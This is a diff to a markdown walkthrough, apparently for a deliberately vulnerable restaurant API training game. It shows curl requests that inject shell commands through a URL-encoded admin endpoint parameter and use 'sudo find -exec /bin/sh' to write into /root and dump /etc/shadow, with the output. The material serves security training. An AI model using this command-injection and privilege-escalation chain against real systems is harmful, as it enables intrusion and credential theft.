@@ -167,7 +167,13 @@ curl -H "Authorization: Bearer ${CHEF_TOKEN}" \
 "http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'echo%20RCE%20test%20%3E%20/root/garbage.w00t'%20\\;"
 {"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm"}
 ```
+
+### validate garbage file creation
+
 ```bash
+curl -H "Authorization: Bearer ${CHEF_TOKEN}" "http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'ls%20/root'%20\\;"
+{"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  138G   12G  93% /\n/dev/mapper/fedora-root  149G  138G   12G  93% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\ngarbage.w00t\ngarbage.w00t\ngarbage.w00t"}
+
 podman exec --user=root  damn-vulnerable-restaurant-api-game-web-1 ls /root/
 total 24
 drwx------.  2 root root  67 Apr 19 17:01 .
@@ -177,4 +183,82 @@ dr-xr-xr-x. 22 root root  63 Apr 19 16:42 ..
 -rw-r--r--.  1 root root 148 Aug 17  2015 .profile
 -rw-r--r--.  1 root root 254 Jun 13  2023 .wget-hsts
 -rw-r--r--.  1 root root   9 Apr 19 17:01 garbage.w00t
+```
+
+### for good measure... :beer:
+```bash
+curl -H "Authorization: Bearer ${CHEF_TOKEN}" \
+"http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'cat%20/etc/shadow'%20\\;" | \
+jq -r '.output'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2037  100  2037    0     0  60209      0 --:--:-- --:--:-- --:--:-- 61727
+Filesystem               Size  Used Avail Use% Mounted on
+fuse-overlayfs           149G  138G   12G  93% /
+/dev/mapper/fedora-root  149G  138G   12G  93% /app
+tmpfs                     64M     0   64M   0% /dev
+devtmpfs                 4.0M     0  4.0M   0% /dev/mem
+tmpfs                    996M  1.2M  995M   1% /etc/hosts
+shm                       63M     0   63M   0% /dev/shm
+root:*:19520:0:99999:7:::
+daemon:*:19520:0:99999:7:::
+bin:*:19520:0:99999:7:::
+sys:*:19520:0:99999:7:::
+sync:*:19520:0:99999:7:::
+games:*:19520:0:99999:7:::
+man:*:19520:0:99999:7:::
+lp:*:19520:0:99999:7:::
+mail:*:19520:0:99999:7:::
+news:*:19520:0:99999:7:::
+uucp:*:19520:0:99999:7:::
+proxy:*:19520:0:99999:7:::
+www-data:*:19520:0:99999:7:::
+backup:*:19520:0:99999:7:::
+list:*:19520:0:99999:7:::
+irc:*:19520:0:99999:7:::
+gnats:*:19520:0:99999:7:::
+nobody:*:19520:0:99999:7:::
+_apt:*:19520:0:99999:7:::
+app:!:19832:0:99999:7:::
+root:*:19520:0:99999:7:::
+daemon:*:19520:0:99999:7:::
+bin:*:19520:0:99999:7:::
+sys:*:19520:0:99999:7:::
+sync:*:19520:0:99999:7:::
+games:*:19520:0:99999:7:::
+man:*:19520:0:99999:7:::
+lp:*:19520:0:99999:7:::
+mail:*:19520:0:99999:7:::
+news:*:19520:0:99999:7:::
+uucp:*:19520:0:99999:7:::
+proxy:*:19520:0:99999:7:::
+www-data:*:19520:0:99999:7:::
+backup:*:19520:0:99999:7:::
+list:*:19520:0:99999:7:::
+irc:*:19520:0:99999:7:::
+gnats:*:19520:0:99999:7:::
+nobody:*:19520:0:99999:7:::
+_apt:*:19520:0:99999:7:::
+app:!:19832:0:99999:7:::
+root:*:19520:0:99999:7:::
+daemon:*:19520:0:99999:7:::
+bin:*:19520:0:99999:7:::
+sys:*:19520:0:99999:7:::
+sync:*:19520:0:99999:7:::
+games:*:19520:0:99999:7:::
+man:*:19520:0:99999:7:::
+lp:*:19520:0:99999:7:::
+mail:*:19520:0:99999:7:::
+news:*:19520:0:99999:7:::
+uucp:*:19520:0:99999:7:::
+proxy:*:19520:0:99999:7:::
+www-data:*:19520:0:99999:7:::
+backup:*:19520:0:99999:7:::
+list:*:19520:0:99999:7:::
+irc:*:19520:0:99999:7:::
+gnats:*:19520:0:99999:7:::
+nobody:*:19520:0:99999:7:::
+_apt:*:19520:0:99999:7:::
+app:!:19832:0:99999:7:::
+
 ```
